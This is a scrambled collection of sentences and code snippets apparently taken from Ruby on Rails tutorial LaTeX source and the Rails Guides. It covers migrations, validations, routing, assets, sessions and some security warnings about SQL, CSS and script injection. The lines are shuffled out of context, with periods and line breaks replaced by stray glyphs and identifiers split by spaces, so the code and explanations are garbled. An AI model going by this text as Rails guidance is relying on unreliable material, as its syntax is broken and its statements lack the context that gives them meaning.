If you &apos;re not using the cloud IDE or an equivalent Linux system , do a Google search for ``imagemagick &lt; your platform &gt; &apos; &apos; .
As noted in Section ~ \ ref { sec : a _ hashed _ password } , \ kode { has \ _ secure \ _ password } automatically adds an \ kode { authenticate } method to the corresponding model objects .
&lt; % = image _ tag &quot; home ▖ gif &quot; , size : &quot; 50x20 &quot; % &gt;
$ subl .
No real understanding .
Any subsequent conditions chained to the returned relation will continue generating empty relations ▖
# # # HTTP Verb Constraints
To include `app / assets / javascripts / main ▖ js` and `app / assets / javascripts / photos / columns ▖ js` :
module YourApp
assemblies ▖ destroy ( object , ▖ ▖ ▖ )
Inside the block , the \ kode { create \ _ table } method uses the \ kode { t } ~ object to create \ kode { name } and \ kode { email } columns in the database , both of type \ kode { string }
Every time a validation fails , an error message is added to the object &apos;s ╼ `errors` collection , and this message is associated with the attribute being ╼ validated .
Here we &apos;ve used
4 examples , 1 failure
class CreateSuppliers &lt; ActiveRecord : : Migration
in Listing ~ \ ref { code : gemfile _ sample _ app } .
Something like :
Including \ kode { if request ▖ get ? } \ prevents this from happening
The video tag also supports all of the ` &lt; video &gt; ` HTML options through the HTML options hash , including :
# # # `find _ or _ create _ by`
Before using Git , you should perform a set of one-time setup steps .
Note also the use of \ kode { @ user ▖ reload } ( first seen in Section ~ \ ref { sec : updating _ user _ objects } ) to reload the user &apos;s values from the database and confirm that they were successfully updated .
# # # # Methods Added by `has _ one`
In the present context , a \ emph { hash } refers not to the Ruby data structure from Section ~ \ ref { sec : hashes _ and _ symbols } but rather to the result of applying an irreversible \ href { http : / / en ▖ wikipedia ▖ org / wiki / Hash _ function } { hash function } to input data ▖ )
class _ name
&lt; p &gt; Welcome !
Here \ kode { Word &lt; String } is the Ruby syntax for inheritance ( discussed briefly in Section ~ \ ref { sec : static _ pages } ) , which ensures that , in addition to the new \ kode { palindrome ? } \ method , words also have all the same methods as strings :
The commit and push sequence above represents the kind of pattern I would ordinarily follow in real-life development , but for simplicity I &apos;ll typically omit such intermediate commits from now on .
They are often useful because they are truly literal , and contain exactly the characters you type .
Note the leading underscore character : partials are named with a leading underscore to distinguish them from regular views , even though they are referred to without the underscore ▖
in Listing ~ \ ref { code : sample _ app _ readme } .
Defaults ╼ to ` &apos; http authentication &apos; ` .
\ \ \ filepath { app / helpers / application \ _ helper ▖ rb } } ╼ % = lang : ruby ╼ \ begin { code } ╼ module ApplicationHelper ╼ ╼
In our case , we want it to show up when we ╼ navigate to the root URL of our site , &lt; http : / / localhost : 3000 &gt; ▖
The `object` and `as` options can also be used together :
Here we &apos;ve included the \ kode { params &#91; : user &#93; } hash expected by \ kode { User ▖ new } in the \ kode { create } action ( Listing ~ \ ref { code : signup _ flash } ) .
INFO : As a rule of thumb you can think of `underscore` as the inverse of `camelize` , though there are cases where that does not hold ▖
Active Record allows us to impose such constraints using \ emph { validations } ( seen briefly before in Section ~ \ ref { sec : putting _ the _ micro _ in _ microposts } ) .
We can now check our database just to be double-sure that the new user was actually created :
For example , on my system either of the following works ( depending on whether I &apos;m using the cloud IDE or the local server ) :
Allowing empty passwords on update ▖
# # # Configuring i18n
* How to install Rails , create a new Rails application , and connect your ╼ application to a database .
No layout .
# # # CSS Injection
* `collection ▖ create ! (
This introduces the Sass \ emph { mixin } facility , in this case called \ kode { box \ _ sizing } .
The generation of the reader instance method can be prevented by setting the option ` : instance _ reader` to `false` .
This noisier construction makes debugging easier by avoiding silent errors .
# No change needed ; PATCH will be preferred , and PUT will still work .
* Environment-specific configuration files
To fix this , we just need to add the user id presence validation shown in Listing ~ \ ref { code : micropost _ user _ id _ validation } .
config ▖ assets ▖ digest = false
&lt; div &gt; &lt; % = submit _ tag &apos; Save &apos; % &gt; &lt; / div &gt;
We &apos;ll use an HTML \ emph { form } to submit user signup information to our application ( Section ~ \ ref { sec : signup _ form } ) , which will then be used to create a new user and save its attributes to the database ( Section ~ \ ref { sec : successful _ signups } ) .
$ cd ~ / workspace /
# # # # number _ with _ precision
Before we move on , though , there are two tasks to complete .
When the user clicks the link , find the user by email address , and then authenticate the token by comparing with the activation digest .
( If instead you get an error message indicating that the email address has already been taken , be sure to run the \ kode { db : migrate : reset } Rake task as indicated in Section ~ \ ref { sec : signup _ form } and restart the development webserver ▖ )
Action Mailer 3 ▖ 0 makes inline attachments , which involved a lot of hacking in pre 3 ▖ 0 versions , much simpler and trivial as they should be .
Having shown how to create , show , and edit users , we come finally to destroying them ( Figure ~ \ ref { fig : demo _ destroy _ user } ) .
in Listing ~ \ ref { code : rails _ routes _ root _ route } .
As constructed , only admins can destroy users through the web since only they can see the delete links , but there &apos;s still a terrible security hole : any sufficiently sophisticated attacker could simply issue a \ texttt { DELETE } request directly from the command line to delete any user on the site .
# # # Controller Specific Assets
Rails also comes with built-in help that you can generate using the rake ╼ command-line utility :
In this chapter , we will principally be developing the static pages introduced in Section ~ \ ref { sec : static _ pages } , including a site logo , a navigation header , and a site footer .
Then add another search feature for microposts .
╼ * compiled file , but it &apos;s generally better to create a new file per style
Client ▖ order ( &quot; created _ at DESC &quot; )
Integers in the example above are supposed to come from the respective calls to `id` .
At the end of this process , no matter where you started , you should be ready for the many more intermediate-to-advanced Rails resources out there .
On Windows , many users prefer to develop Rails applications in a virtual machine running Linux , in which case your command-line options reduce to the previous case .
Use Rails &apos; `sanitize ( ) ` method as a model for a whitelist CSS filter , if you really need one .
In the case of a belongs _ to relationship , an association key can be used to specify the model if an Active Record object is used as the value ▖
def update
# do something before perform
The method `strip _ heredoc` strips indentation in heredocs .
# Adds a &quot; ! &quot; to original template .
\ label { table : RESTful _ microposts } } ╼ \ end { table } ╼ ╼ \ subsection { Micropost access control } % ( fold ) ╼ \ label { sec : micropost _ access _ control } ╼ ╼
On a production site with significant traffic , it is a good idea to turn \ href { https : / / devcenter ▖ heroku ▖ com / articles / maintenance-mode } { \ emph { maintenance mode } } on before making the changes :
in Listing ~ \ ref { code : micropost _ validations } .
Unfortunately , as noted in the text and in the comment in Listing ~ \ ref { code : failed _ login _ attempt } , this code isn &apos;t quite right .
But , this is also a threat to web applications , as malicious code can be hidden in different encodings that the web browser might be able to process , but the web application might not ▖
All contributions , either via master or docrails , get credit in &#91; Rails Contributors &#93; ( http : / / contributors ▖ rubyonrails ▖ org ) .
&lt; % = form _ for @ article do &#124; f &#124; % &gt;
* * `Rack : : ETag` * *
╼ ╼ \ end { enumerate } ╼ ╼ % subsection user _ micropost _ associations ( end ) ╼ ╼ \ subsection { Micropost refinements } % ( fold ) ╼ \ label { sec : ordering _ and _ dependency } ╼ ╼
{ puts } ) a string consisting of the city and state separated by a comma and as space , as in ``Los Angeles , CA &apos; &apos; ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-768a74 &apos; &gt; &lt; / span &gt; ╼ ╼ \ item Repeat the previous exercise but with the city and state separated by a tab character ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-54fc65 &apos; &gt; &lt; / span &gt; ╼ ╼ \ item What is the result if you replace double quotes with single quotes in the previous exercise ? ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-4820a5 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ \ subsection { Objects and message passing } % ( fold ) ╼ \ label { sec : objects _ and _ message _ passing } ╼ ╼
as shown in Listing ~ \ ref { code : micropost _ model _ image _ validation } .
The \ texttt { &#124; &#124; = } ( ``or equals &apos; &apos; ) assignment operator is a common Ruby idiom and is thus important for aspiring Rails developers to recognize .
make directory
&quot; author _ id &quot; ▖ humanize # = &gt; &quot; Author &quot;
module Billing
To render a partial as part of a view , you use the `render` method within the view :
This standard directory and file structure ( Figure ~ \ ref { fig : directory _ structure _ rails } ) is one of the many advantages of Rails ; it immediately gets you from zero to a functional ( if minimal ) application .
As seen in Listing ~ \ ref { code : name _ presence _ test } , all we need to do is set the \ kode { @ user } variable &apos;s \ kode { name } attribute to a blank string ( in this case , a string of spaces ) and then check ( using the \ kode { assert \ _ not } method ) that the resulting User object is not valid .
A singular resourceful route generates these helpers :
At this point , we can reseed the development database as usual :
For example , suppose we create an array , assign a second variable to it , and then reverse the first array in place using the \ kode { reverse ! }
# # # # text _ area _ tag
Topic ▖ create ( title : &quot; &quot; ) ▖ valid ?
Although we will use ``following &apos; &apos; as a label , as in ``50 following , 75 followers &apos; &apos; , we &apos;ll use ``followed users &apos; &apos; for the users themselves , with a corresponding \ kode { user ▖ followed \ _ users } array
$ bundle exec rake test TEST = test / integration / users _ login _ test ▖ rb ╼ $ bundle exec rake test
We can now reproduce the previous behavior of \ kode { authenticated ? } \ by invoking it like this :
What happens if a module is anonymous ?
# = &gt; &#91; 1 , 2 , 3 &#93;
&lt; div class = &quot; field &quot; &gt;
A `has _ one` association also sets up a one-to-one connection with another model , but with somewhat different semantics ( and consequences ) ▖
( Since Factory Girl is only needed in the tests , we &apos;ve put it in the \ kode { : test } group ▖ )
uses the Capybara function \ kode { visit } to simulate visiting the URL \ kode { / static \ _ pages / home } in a browser , while the line
as shown in Listing ~ \ ref { code : f _ error _ messages } .
to hide all images ▖ } ╼ % = lang : css ╼ \ begin { code } ╼ img { ╼ display : none ; ╼ } ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ ╼ % subsection custom _ css ( end ) ╼ ╼ \ subsection { Partials } % ( fold ) ╼ \ label { sec : partials } ╼ ╼
Writing an automated test for image upload is left as an exercise ( Section ~ \ ref { sec : exercises _ basic _ image _ upload } ) .
The ╼ most important one being `Cache-Control` which tells the CDN ( and web browsers ) ╼ how to cache contents ▖
# # # # # ` : dependent`
\ emph { I } don &apos;t know what they all do , and I &apos;ve been programming in Ruby on Rails since 2005 .
This leads us to ask two questions : When a user follows another user , what is being created ?
# # # # Running a Single Test
\ href { https : / / www ▖ codeschool ▖ com / } { Code School } : Good interactive online programming courses
The `content _ for` method is very helpful when your layout contains distinct regions such as sidebars and footers that should get their own blocks of content inserted ▖
As indicated in Listing ~ \ ref { code : cat _ public _ key } , users of the cloud IDE can view their public key using the \ kode { cat } command , which can then be selected and copied .
Since email addresses are case-insensitive ( Section ~ \ ref { sec : format _ validation } ) but MD5 hashes are not , we &apos;ve used the \ kode { downcase } method to ensure that the argument to \ kode { hexdigest } is all lower-case .
Call the scope as if it were a class method :
Note the use of the \ kode { raw } method to prevent Rails from escaping the resulting HTML , together with the \ kode { sanitize } method needed to prevent cross-site scripting .
After updating the Rails version ╼ in the Gemfile , run this rake task .
&lt; % = stylesheet _ link _ tag &quot; application &quot; % &gt;
Here Rails automatically inserts the value of \ kode { about \ _ path } in place of the question mark ( escaping any special characters if necessary ) , thereby checking for an HTML tag of the form
I shall be late ▖ ▖ ▖ &quot;
For example , if the \ kode { create } action defines an \ kode { @ user } variable , we can access it in the test using \ kode { assigns ( : user ) } .
xml ▖ link ( @ person ▖ firm ▖ account ▖ url + @ recent _ items ▖ url ( item ) )
* `find _ or _ initialize _ by _ ▖ ▖ ▖ ` becomes `find _ or _ initialize _ by ( ▖ ▖ ▖ ) ` .
def file _ sha ( path )
Partial templates - usually just called &quot; partials &quot; - are another device for breaking the rendering process into more manageable chunks ▖
# # # # stylesheet _ url
The actions in Listing ~ \ ref { code : following _ followers _ actions } render the view from Listing ~ \ ref { code : show _ follow _ view } in two contexts , ``following &apos; &apos; and ``followers &apos; &apos; , with the results shown in Figure ~ \ ref { fig : user _ following } and Figure ~ \ ref { fig : user _ followers } .
See the \ href { http : / / devcenter ▖ heroku ▖ com / } { Heroku documentation } for more information about custom domains and other Heroku topics .
* ` ( association _ name ) _ type` - Stores the type for ╼ &#91; polymorphic associations &#93; ( association _ basics ▖ html # polymorphic-associations ) .
edit _ article GET / articles / : id / edit ( ▖ : format ) articles # edit
Here &apos;s a scenario that explains why :
A mockup of the user profile after a successful login .
Again , you ╼ create a file `app / views / comments / _ form ▖ html ▖ erb` containing :
You can use this to pull out data from an environment variable or to perform calculations to generate the needed connection information .
c ▖ locked = false
NoMethodError : undefined method `empty ? &apos;
This validates the attribute with the given \ emph { regular expression } ( or \ emph { regex } ) , which is a powerful ( and often cryptic ) language for matching patterns in strings .
# # # Instance Variables
# Blog ▖ all ▖ to _ formatted _ s # = &gt; &quot; First PostSecond PostThird Post &quot;
# # # CaptureHelper
First , the engine needs to be specified inside the application &apos;s `Gemfile` ▖
So far we &apos;ve entered class definitions at the console , but this quickly becomes tiresome ; instead , create the file \ kode { example \ _ user ▖ rb } in your application root directory and fill it with the contents of Listing ~ \ ref { code : example _ user } .
To define an environment called &quot; staging &quot; for this server , just create a file called `config / environments / staging ▖ rb` ▖
We &apos;ll discuss them further in Section ~ \ ref { sec : professional _ grade _ deployment } ▖ )
WARNING : Building your own conditions as pure strings can leave you vulnerable to SQL injection exploits ▖
As long as you retain this notice you ╼ * can do whatever you want with this stuff .
You can think of symbols as basically strings without all the extra baggage
The result in the case of the debug box is shown in Figure ~ \ ref { fig : home _ page _ with _ debug } .
We &apos;ve seen how the User model generation in Listing ~ \ ref { code : generate _ user _ model } generated a migration file ( Listing ~ \ ref { code : users _ migration } ) , and we saw in Figure ~ \ ref { fig : sqlite _ database _ browser } the results of running this migration : it updated a file called \ kode { development ▖ sqlite3 } by creating a table \ kode { users } with columns \ kode { id } , \ kode { name } , \ kode { email } , \ kode { created \ _ at } , and \ kode { updated \ _ at } .
# Defines a proto-feed .
( The expression above has one notable weakness : it allows invalid addresses that contain consecutive dots , such as \ kode { foo @ bar ▖ ▖ com } .
Article ▖ created _ before ( Time ▖ zone ▖ now )
in Listing ~ \ ref { code : static _ page _ routes _ test } .
As a final step , we &apos;ll write a couple of tests to double-check the results shown in the email previews .
If you find a bug report without a test , it &apos;s very useful to contribute a failing test ▖
For instance , the following example would go to the application &apos;s `articles _ path` ╼ if that template was rendered from the application , or the engine &apos;s `articles _ path` ╼ if it was rendered from the engine :
0 ▖ ▖ 7 ) # = &gt; false
Less emphasis on features specific to any given version of Rails , with greater emphasis on general principles of web development
as seen in Listing ~ \ ref { code : cookie _ sign _ in } .
The method `weeks _ ago` works analogously for weeks :
A generalized \ kode { authenticated ? } \
resources : comments
Default is &quot; and &quot; .
Here is some sample code to do this :
The URL generated will have the full path to your CDN .
Adding Assets to Your Gems
mime _ type : &apos; application / x-gzip &apos; ,
We won &apos;t be needing CoffeeScript in this tutorial , but it &apos;s an elegant little language that compiles to JavaScript .
Since we &apos;re about to add the ability to create new users through the web , let &apos;s remove the user created at the console in Section ~ \ ref { sec : creating _ and _ authenticating _ a _ user } .
# Compress JavaScripts and CSS
The large number of Rails programmers also makes it easier to handle the inevitable application errors : the ``Google the error message &apos; &apos; algorithm nearly always produces a relevant blog post or discussion-forum thread .
Finally , we &apos;ll add authorization methods to our actions to enforce a site security model .
In this section , we &apos;ll combine Bootstrap with some custom CSS rules to start adding some style to the sample application .
The solution is to use a \ emph { hidden field } to place ( but not display ) the email on the page , and then submit it along with the rest of the form &apos;s information .
Tests for a Contact page .
In the Blog application , you will now create a new _ resource _ ▖
We can verify that Listing ~ \ ref { code : micropost _ dependency } is working with a test for the User model .
You can specify a full path relative to the document root , or a URL ▖
Having users sign in will also allow us to implement a security model , restricting access to particular pages based on the identity of the signed-in user .
The result of adding these additional checks appears in Listing ~ \ ref { code : _ format _ jquery _ file _ test } .
Indeed , in Section ~ \ ref { sec : creating _ microposts } we &apos;ll use a text \ emph { area } instead of a text field for submitting microposts .
# # # # email _ field _ tag
&lt; / optgroup &gt;
Since \ kode { user \ _ params } will only be used internally by the Users controller and need not be exposed to external users via the web , we &apos;ll make it \ emph { private } using Ruby &apos;s \ kode { private } keyword , as shown in Listing ~ \ ref { code : create _ action _ strong _ parameters } .
The result of this operation is an array of three strings .
After creating the topic branch , we &apos;ll edit it to make it a little more descriptive .
There &apos;s a complementary \ kode { unless } keyword that works the same way :
# # # # sanitize _ css ( style )
Note that the debug information in Figure ~ \ ref { fig : user _ show _ rails } confirms the value of \ kode { params &#91; : id &#93; } :
# # # # text _ field _ tag
The initial Users controller , with a \ kode { new } action .
The cloud IDE also includes the three essential components needed to develop web applications : a text editor , a filesystem navigator , and a command-line terminal ( Figure ~ \ ref { fig : ide _ anatomy } ) .
# # # X-Sendfile Headers
A partial for the site header .
By default , files are loaded from `public / videos` .
The Home page with a proto-feed .
Recall from Section ~ \ ref { sec : git _ commands } that , when using Git , it &apos;s a good practice to do our work on a separate topic branch rather than the master branch .
$ git pull JohnSmith orange
You can use the ` : as` option to prefix the named route helpers that Rails generates for a route ▖
You can also cache multiple JavaScript files into one file , which requires less HTTP connections to download and can better be compressed by gzip ( leading to faster transfers ) ▖
Adds all sub-directories of `app` and paths specified by `config ▖ autoload _ paths` to `ActiveSupport : : Dependencies ▖ autoload _ paths` .
First navigate to the root directory of the first app and initialize a new repository :
We can tell the difference between integration tests and other kinds of tests using Ruby &apos;s convenient \ kode { defined ? } \ method , which returns true if its argument is defined and false otherwise .
There is a ` : scope` option that you can use to specify other attributes that ╼ are used to limit the uniqueness check :
as seen in Listing ~ \ ref { code : user _ model _ password _ reset } .
s = &quot; &lt; script &gt; ▖ ▖ ▖ &lt; / script &gt; &quot; ▖ html _ safe
&lt; ! -- &#91; if lt IE 9 &#93; &gt;
orders ▖ find ( ▖ ▖ ▖ )
The way to get the failing test in Listing ~ \ ref { code : flash _ persistence _ test } to pass is to replace \ kode { flash } with the special variant \ kode { flash ▖ now } , which is specifically designed for displaying flash messages on rendered pages .
Tests for the follow and unfollow buttons ▖
You could add the following to `app / controllers / application ▖ rb` :
# # # Updating the Gemfile ▖ lock
# Defaults to :
rm -rf &lt; directory &gt;
Web browsers are ╼ limited in the number of requests that they can make in parallel , so fewer ╼ requests can mean faster loading for your application .
You can call `destroy` on Active Record objects when you want to delete ╼ them from the database ▖
instead , and it would work just the same , but ( as mentioned briefly in Section ~ \ ref { sec : layout _ exercises } ) the conventional order for the arguments to \ kode { assert \ _ equal } is \ emph { expected } , \ emph { actual } :
Given a string with a qualified constant name , `demodulize` returns the very constant name , that is , the rightmost part of it :
mattr _ accessor : load _ paths
/ / = require moovinator
After request is complete , flushes all the logs .
Since jQuery is the default ╼ JavaScript library from Rails 3 ▖ 1 onwards , you don &apos;t need to copy `jquery ▖ js` ╼ into `app / assets` and it will be included automatically .
The methods `beginning _ of _ week` and `end _ of _ week` return the dates for the ╼ beginning and end of the week , respectively ▖
Once these CSS rules have been applied , the signup page appears as in Figure ~ \ ref { fig : signup _ form } .
# # # # Naming Partials
You can supply a path to the audio file if you like :
route resources : microposts
{ nil = &gt; nil , 1 = &gt; 1 , : x = &gt; : a } ▖ transform _ values { &#124; value &#124; value ▖ to _ s ▖ upcase }
# attribs : id , name , continent _ id
For example
Here &apos;s a full usage example :
If you set up this route :
To do that , ╼ bind to the `ajax : success` event ▖
To avoid this problem , we &apos;ll use a \ emph { signed } cookie , which securely encrypts the cookie before placing it on the browser :
Getting Up and Running
$ rails generate model User name : string email : string
# # # Optimistic Locking
When we make the appropriate request to the Users controller , \ kode { params &#91; : id &#93; } will be the user id ~ \ texttt { 1 } , so the effect is the same as the \ kode { find } method
With this foundation , we are ready for a more efficient feed implementation , as seen in Listing ~ \ ref { code : feed _ final } .
C : : X &quot; ) # = &gt; true
= &gt; &#91; 1 , 3 , 2 &#93;
At this point , go ahead and create a micropost or two , taking care to make sure that at least one has a \ kode { user \ _ id } of ~ \ kode { 1 } to match the id of the first user created in Section ~ \ ref { sec : a _ user _ tour } .
# # # Segment Constraints
A user with updated information .
# # # `starts _ with ? ` and `ends _ with ? `
# # # Main Features
def bind ( object )
in Listing ~ \ ref { code : password _ resets _ integration _ test } .
/ contact
The ` : allow _ nil` option skips the validation when the value being validated is ╼ `nil` .
Putting all the elements above together , we are now in a position to add microposts to the profile page , as shown in Listing ~ \ ref { code : user _ show _ microposts } .
Date ▖ new ( 2010 , 5 , 24 ) ▖ weeks _ ago ( 2 ) # = &gt; Mon , 10 May 2010
When a filename is unique and based on its content , HTTP headers can be set to ╼ encourage caches everywhere ( whether at CDNs , at ISPs , in networking equipment , ╼ or in web browsers ) to keep their own copy of the content ▖
The method is to require each user to have a password ( with a password confirmation ) , and then store a \ emph { hashed } version of the password in the database .
array = &#91; 1 , &#91; 2 , 3 &#93; &#93;
The page looks fine , though , so what &apos;s the problem ?
= &gt; &#91; # &lt; Micropost id : 1 , content : &quot; First micropost ! &quot; , user _ id : 1 , ╼ created _ at :
The `helpers` , `mailers` and `models` directories are ╼ empty , so they aren &apos;t described in this section ▖
The \ kode { update \ _ attributes } method accepts a hash of attributes , and on success performs both the update and the save in one step ( returning \ kode { true } to indicate that the save went through ) .
Manifest files
The code is exactly analogous to Listing ~ \ ref { code : account _ activation _ preview } , as shown in Listing ~ \ ref { code : password _ reset _ preview } .
Recall from Section ~ \ ref { sec : objects _ and _ message _ passing } that \ kode { ! ! } \ converts an object to its corresponding boolean value .
To accomplish this , we will need some fairly advanced Rails , Ruby , and even SQL programming techniques .
The code in Listing ~ \ ref { code : user _ index _ view } uses the result of Listing ~ \ ref { code : gravatar _ option _ redux } from Section ~ \ ref { sec : signup _ exercises } , which allows us to pass an option to the Gravatar helper specifying a size other than the default .
JavaScript enforces the same origin policy , that means a script from one domain cannot access cookies of another domain ▖
Here we have accessed the user &apos;s microposts using the code \ kode { first \ _ user ▖ microposts } : with this code , Active Record automatically returns all the microposts with \ kode { user \ _ id } equal to the id of \ kode { first \ _ user } ( in this case , ~ \ kode { 1 } ) .
u ▖ occupation = &quot; Code Artist &quot;
Utility tasks available via the \ kode { rake } command
The result is shown in Figure ~ \ ref { fig : home _ root _ route } .
The sample application with Bootstrap CSS ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / sample _ app _ only _ bootstrap _ 4 _ 0-full ▖ png } { ( full size ) }
has _ one : account _ history , through : : account
The view for the About page with full HTML structure ▖
INFO : _ CSS Injection is actually JavaScript injection , because some browsers ( IE , some versions of Safari and others ) allow JavaScript in CSS ▖ Think twice about allowing custom CSS in your web application .
Navigating to his home page , Calvin now sees an incremented ``following &apos; &apos; count and finds Hobbes &apos;s microposts in his status feed ( Figure ~ \ ref { fig : page _ flow _ home _ page _ feed _ mockup } ) .
But wait---actions don &apos;t have return values , at least not ones that matter .
You can also define other defaults in a route by supplying a hash for the ` : defaults` option ▖
The vi editor is one of the most ancient yet powerful weapons in the Unix arsenal , and Vim is ``vi improved &apos; &apos; .
Example :
You can use a shorthand syntax for rendering collections ▖
If `config ▖ action _ dispatch ▖ show _ exceptions` is set to `false` , exceptions will be raised regardless .
We &apos;ll learn more about HTTP request methods starting in Section ~ \ ref { sec : getting _ started _ with _ testing } .
If you wish to use an initializer - code that should run before the engine is ╼ loaded - the place for it is the `config / initializers` folder ▖
# # # # Named dates
* `Rack : : Runtime` sets an `X-Runtime` header , containing the time ( in seconds ) taken to execute the request .
@ ips = Blacklist ▖ retrieve _ ips
With `includes` , Active Record ensures that all of the specified associations are loaded using the minimum possible number of queries .
Officially pronounced ``ess-cue-ell-ite &apos; &apos; , although the ( mis ) pronunciation ``sequel-ite &apos; &apos; is also common .
With the status feed design requirements captured in the test from Listing ~ \ ref { code : full _ feed _ test } , we &apos;re ready to start writing the feed .
To secure the site properly , we also need access control on the \ kode { destroy } action , so that \ emph { only } admins can delete users .
UserMailer ▖ welcome ( @ user ) ▖ deliver _ now
╼ ╼ test &quot; should get help &quot; do ╼ get : help ╼ assert _ response : success ╼ assert _ select &quot; title &quot; , &quot; Help
as shown in Listing ~ \ ref { code : email _ downcase } .
If you want a variable to contain a literal backslash , single quotes make it easier :
This prevents storing the forwarding URL if a user , say , submits a form when not logged in ( which is an edge case but could happen if , e ▖ g ▖ , a user deleted the session cookies by hand before submitting the form ) .
Why Associations ?
or , for a single case :
An integration test for password resets .
You can still use the ╼ ` : message` option to specify an error message .
For example , MySQL has an expression called `LOCK IN SHARE MODE` where you can lock a record but still allow other queries to read it ▖
Contributing to the Rails Documentation
Application log files
&#124; GET &#124; / photos / new &#124; images # new &#124; new _ photo _ path &#124;
For example , you can use this technique to reduce duplication between new and edit pages , while still keeping a bit of distinct content :
# # # `valid ? ` and `invalid ?
It then tests that the page content and title both contain the user &apos;s name .
Adding code for a pretty debug box , including a Sass mixin .
This is done via the JavaScript file `jquery _ ujs` ╼ which is automatically included into your application &apos;s layout ╼ ( `app / views / layouts / application ▖ html ▖ erb` ) when you generated the application ▖ ╼
As in Chapter ~ \ ref { cha : rails _ flavored _ ruby } , our tool of choice for exploring data models is the Rails console .
NOTE : Defined in `active _ support / core _ ext / module / anonymous ▖ rb` .
Engines can be considered miniature applications that provide functionality to ╼ their host applications ▖
# Runs all the validations within the specified context .
logout _ path
@ customer = @ order ▖ build _ customer ( customer _ number : 123 ,
Tests for delete links .
use ActionDispatch : : Static
&#124; HTTP Verb &#124; Path &#124; Controller # Action &#124; Used for &#124;
class ThirdPartyLibrary : : Crawler
&lt; pre class = &apos; debug _ dump &apos; &gt; ---
# # # # Transformation
We &apos;re now in a position to start implementing our signin model , namely , remembering user signin status ``forever &apos; &apos; and ending the session only when the user explicitly signs out .
At this point , our deletion code is well-tested , and the test suite should be \ passing :
Finally , we &apos;ll write an integration test to log in , check the micropost pagination , make an invalid submission , make a valid submission , delete a post , and then visit a second user &apos;s page to make sure there are no ``delete &apos; &apos; links .
As a result , evaluation falls off the end of the \ kode { current \ _ user } method , thereby returning \ kode { nil } as required .
But there are two perhaps more idiomatically correct ways to define class methods , one slightly confusing and one extremely confusing .
A partial to render a single user .
scope : published , - &gt; { where ( published : true ) }
Whichever option you choose , I recommend running the \ kode { rails server } command in a second terminal tab so that you can still issue commands in the first tab , as shown in Figure ~ \ ref { fig : new _ terminal _ tab } and Figure ~ \ ref { fig : rails _ server _ new _ tab } .
Though of necessity our efforts will focus on this specific sample application , the emphasis throughout the \ emph { Rails Tutorial } will be on general principles , so that you will have a solid foundation no matter what kinds of web applications you want to build .
Adding the CSS for the site footer .
And you can tell the method not to fill the smaller groups passing `false` :
def comment _ params
Also we commonly want to set `max-age` which is how long ╼ the cache will store the object before invalidating the cache ▖
Be careful about using the \ kode { -a } flag improperly ; if you have added any new files to the project since the last commit , you still have to tell Git about them using \ kode { git add -A } first .
Because HTTP is a \ href { http : / / en ▖ wikipedia ▖ org / wiki / Hypertext _ Transfer _ Protocol # HTTP _ session _ state } { \ emph { stateless protocol } } , web applications requiring user signin must implement a way to track each user &apos;s progress from page to page .
in Listing ~ \ ref { code : initial _ signup _ test } .
Happily , the form variable ~ \ kode { f } can access the associated object through \ kode { f ▖ object } , so that in
instead of the equivalent code
person ▖ errors ▖ size # = &gt; 0
attr _ accessor : author _ name
It uses the ╼ `blank ? ` method to check if the value is either `nil` or a blank string , that ╼ is , a string that is either empty or consists of whitespace .
* ` : delete _ all` causes all the associated objects to be deleted directly from the database ( so callbacks will not execute )
Conveniently , a Sessions helper module was generated automatically when generating the Sessions controller ( Section ~ \ ref { sec : sessions _ controller } ) .
In the console session in Section ~ \ ref { sec : a _ user _ class } , we created a new user object with \ kode { User ▖ new } , which we had access to only after requiring the example user file in Listing ~ \ ref { code : example _ user } .
The model tests should now be \ passing :
&#124; JSON &#124; Parameters &#124;
You can use these tags in layouts or other views , although the `auto _ discovery _ link _ tag` , `javascript _ include _ tag` , and `stylesheet _ link _ tag` , are most commonly used in the ` &lt; head &gt; ` section of a layout .
&lt; / header &gt;
To fix this , we simply update the two cases to use the generalized method , as shown in Listing ~ \ ref { code : generalized _ current _ user } and Listing ~ \ ref { code : test _ authenticated _ invalid _ token _ updated } .
A JavaScript file within a Rails application or Rails engine goes in one of three locations : `app / assets` , `lib / assets` or `vendor / assets` ▖
The association between microposts and users .
Also , ╼ creating an application with the `--skip-sprockets` option will generate ╼ a slightly different `config / application ▖ rb` file , with a require statement ╼ for the sprockets railtie that is commented-out ▖
This essentially ╼ means that the application and its engines can have identically named routes and ╼ they will not clash .
In this case , though , such a test involves several new ideas , so for now it &apos;s best deferred to its own section ( Section ~ \ ref { sec : layout _ link _ tests } ) .
# # # Understanding Middlewares
* `has _ many`
( TextMate , which is available only on OS ~ X , is still a good choice if you use a Mac ▖ )
dc : creator &quot; , item ▖ author _ name ) if item _ has _ creator ? (
Te method `to _ formatted _ s` provides a default specifier of &quot; F &quot; ▖
* `config ▖ active _ record ▖ pluralize _ table _ names` specifies whether Rails will look for singular or plural table names in the database ▖
BigDecimal ▖ new ( 5 ▖ 00 , 6 ) ▖ to _ s # = &gt; &quot; 5 ▖ 0 &quot;
Have a look at &#91; send _ file &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActionController / DataStreaming ▖ html # method-i-send _ file ) ╼ on how to use this feature .
It can be convenient to set it to false for testing .
Using RSpec
Having developed the User model and the signup functionality , now is a good time to deploy the sample application to production .
Time ▖ zone _ default
Models in Rails use a singular name , and their corresponding database tables ╼ use a plural name ▖
# Do any initialization here
in Listing ~ \ ref { code : signin _ success _ tests } .
* The Ruby on Rails security project posts security news regularly : &#91; http : / / www ▖ rorsecurity ▖ info &#93; ( http : / / www ▖ rorsecurity ▖ info )
WARNING : This guide assumes a working knowledge of Rack protocol and Rack concepts such as middlewares , url maps and `Rack : : Builder` .
By default , this is defined as :
Note here that the routes are drawn upon the `Blorgh : : Engine` object rather than ╼ the `YourApp : : Application` class ▖
If your test suite is mysteriously breaking , be sure to try running \ kode { rake test : prepare } to see if that fixes the problem ▖ )
Otherwise the exception is reraised :
Tests for email format validation ▖
The normally hidden \ kode { ▖ gitignore } file made visible .
as seen in Listing ~ \ ref { code : pages _ routes } .
In this section , we &apos;ll add links to delete users , as mocked up in Figure ~ \ ref { fig : user _ index _ delete _ links _ mockup } , and define the \ kode { destroy } action necessary to accomplish the deletion .
/ / = require phonebox
